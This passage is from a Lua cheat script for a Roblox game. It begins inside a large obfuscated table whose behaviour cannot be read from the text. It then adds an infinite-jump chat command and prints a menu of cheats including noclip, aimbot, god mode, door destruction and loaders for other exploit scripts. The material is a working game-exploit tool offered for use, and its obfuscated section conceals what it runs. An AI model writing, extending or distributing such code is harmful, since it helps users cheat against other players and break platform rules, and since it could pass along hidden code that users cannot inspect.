50))]="\110";[-((#{[560]=75;[395]=770;[659]=218;[470]=990;[635]=323;16;}+4529))]=((#{}+1744));[(3357)]=(493);[-((#{797;[657]=308;164;424;}+3206))]=((960));[(3561)]=((#{738;}+954));[((#{[195]=816;283;}+1485))]="\108";[-(254)]="\105";[(1502)]="\111";[(3769)]=((359));[(4535)]=(2051);[-((#{192;[646]=687;26;916;}+1980))]="\101";[-((#{599;981;367;}+867))]="\97";[-((#{493;657;}+621))]="\110";[(458)]="\105";[((#{498;341;888;}+4941))]=((256));[((#{132;496;11;}+2536))]=((#{40;121;(281);}+268));[(3118)]=(1451);[(736)]="\97";[-((#{}+3849))]=(1450);[(4345)]=((#{61;(244);104;}+(1924)));[((#{}+2631))]=(198);[-(3969)]=(1938);[-(2171)]="\103";[-(1938)]="\114";[-(1549)]="\101";[(2235)]="\111";[-((#{[314]=573;597;622;[713]=797;807;}+4157))]=((4));[-(1450)]="\108";[(5146)]=((#{597;180;(192);}+1416));[-(1214)]="\115";[(2051)]="\101";[-((#{}+1783))]="\98";[((#{}+562))]="\114";[((#{[403]=803;520;}+1095))]="\101";[-((#{426;}+2006))]="\97";[-(276)]="\98";[(5206)]=(21);[(4701)]=(2429);[((#{[444]=692;153;600;295;}+2742))]=((673));[(3341)]=(423);[-((#{}+1673))]="\115";[-((#{131;97;283;}+2229))]="\117";[(2429)]="\99";[-(1504)]="\114";[-(1576)]="\109";[-((#{}+3993))]=(2454);[(3701)]=(1128);[(198)]="\111";[(4908)]=((#{((#{}+590));(108);[724]=490;(207);}+2229));[(673)]="\104";[((#{762;}+5287))]=(((#{576;217;730;885;}+1987)));[(1128)]="\99";[((#{471;}+959))]="\110";[-((#{647;107;520;}+1112))]="\98";[-(3252)]=((1051));[((#{}+4309))]=(1783);[(2858)]=(122);[-(712)]="\99";[(4327)]=((#{12;[681]=285;[(870)]=(154);(375);}+((#{371;652;}+2231))));[((#{[665]=430;106;966;52;738;}+1047))]="\109";[(271)]="\105";[(5059)]=((491));[(4634)]=((#{377;373;}+1864));[-(4071)]=((#{((#{}+548));}+(2181)));[(4832)]=(2433);[(1689)]="\97";[(4799)]=((#{(78);(121);}+1981));[(3426)]=(538);[(122)]="\101";[(1215)]="\107";[(4015)]=(1359);[(4890)]=((#{}+2105));[((#{66;637;898;}+3946))]=((#{506;(51);}+1212));[(4819)]=(((#{[232]=579;979;272;234;307;}+2003)));[(1295)]="\98";[((#{767;429;792;}+2137))]="\98";[-((#{278;585;}+2393))]=(((#{623;[95]=391;164;[146]=452;[725]=418;660;}+218)));[((#{}+5006))]=((1695));[((#{[952]=128;[443]=593;160;}+5214))]=((#{(727);}+1022));[-(105)]="\101";[-(2105)]="\105";[((#{376;667;}+3475))]=(1295);[-(538)]="\116";[-((#{209;}+4218))]=(((#{[217]=308;373;693;159;407;}+65532)));[(5264)]=((#{}+2258));[-(3364)]=((#{}+1109));[-(2990)]=((1138));[(3891)]=((1689));[-(3743)]=(((#{11;889;}+1782)));[(361)]="\98";[(1729)]="\108";[-(1109)]="\98";[(3825)]=(1770);[-(191)]="\112";[-((#{}+3810))]=((#{(770);((#{5;}+396));[(498)]=509;((#{}+663));}+1886));[((#{945;[277]=411;260;518;[374]=512;[561]=286;965;}+4984))]=(3);[-((#{}+3338))]=(1729);[-((#{856;436;590;714;}+1780))]="\116";[(221)]="\116";[-(3813)]=(((#{[657]=725;658;300;758;654;}+1970)));[-(2394)]=((#{[891]=229;26;}+((#{464;663;}+316))));[-(359)]="\97";[-(4436)]=((#{}+32));[-(2305)]=((#{(988);364;}+456));[((#{}+4845))]=((2091));[-(3617)]=(1673);[-(1309)]="\105";[(1121)]="\115";[((#{741;59;}+3180))]=((#{[((#{}+723))]=680;((#{[296]=184;723;[55]=822;730;281;}+912));(256);(253);}+((#{458;217;}+1005))));[-(4076)]=(((#{741;}+90)));[-((#{733;259;433;352;}+2229))]=((2));[-(2851)]=(1025);[-((#{467;}+926))]="\116";[-(1025)]="\114";[((#{[891]=662;274;}+1478))]="\102";[(3034)]=(((#{298;933;[996]=98;57;}+251)));[-((#{987;264;911;412;}+44))]="\119";[(1444)]="\112";[-((#{72;}+3103))]=(550);[((#{}+1770))]="\105";[(2433)]="\101";[-((#{535;882;968;}+4363))]=((#{(309);809;470;}+((#{936;[344]=45;584;}+1827))));[-((#{291;}+422))]="\117";[(3839)]=(1115);[((#{834;717;}+5279))]=((2321));[-((#{571;}+546))]="\97";[(4986)]=(((#{}+36)));[-(314)]="\109";[-((#{951;[18]=702;[492]=149;[114]=810;598;296;}+2088))]="\116";[(5164)]=(1610);[-((#{551;889;883;}+2569))]=(((#{771;}+735)));[(4023)]=((#{(146);925;(835);}+1637));[(1138)]="\110";},(function(...)end));
    
    end
end)

game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
    
if (string.lower(msg) == "/infjump") then

local Player = game:GetService'Players'.LocalPlayer;
local UIS = game:GetService'UserInputService';

_G.JumpHeight = 50;

function Action(Object, Function) if Object ~= nil then Function(Object); end end

UIS.InputBegan:connect(function(UserInput)
    if UserInput.UserInputType == Enum.UserInputType.Keyboard and UserInput.KeyCode == Enum.KeyCode.Space then
        Action(Player.Character.Humanoid, function(self)
            if self:GetState() == Enum.HumanoidStateType.Jumping or self:GetState() == Enum.HumanoidStateType.Freefall then
                Action(self.Parent.HumanoidRootPart, function(self)
                    self.Velocity = Vector3.new(0, _G.JumpHeight, 0);
                end)
            end
        end)
    end
end)
end
end)

print([[
.----------------.
- \\ Dollars Script // -
- // Aimcancels Top \\ -
- \\ Key Binds // -
X - Noclip
C - Reset
H - AntiFe
M - DoorSpam
Q - LockOn
E - ShootLocked
- // Defaults \\ -
Fov 100 - Automatic. - True
FullBright - Automatic. - True
AlwaysDay - Automatic. - True
Door - Destroy All Doors. - Typeable.
EmojiScript - Automatic. - True.
- // Chat Commands \\ -
/door - RemovesDoors True
/god - GodMode True
/rejoin - Rejoin True
/re - Rejoin True
/bs - BlueSky True
/fovfix - NormalFOV True
/fov - FullFOV True
/fullbright - AlwaysDay True
/aimlock - AimBot True
/hvh - OpensComBat True <Glockys Script>
/nhvh - OpensDrPoppa True <Normal Ts Script>
/nce - EnableNoclip True
/hvh2 - OpensAmnesia <Prison Ts Script>
/chat - ShowChat True
/infjump - InfinityJump True
- // More Coming Soon \\ -
]])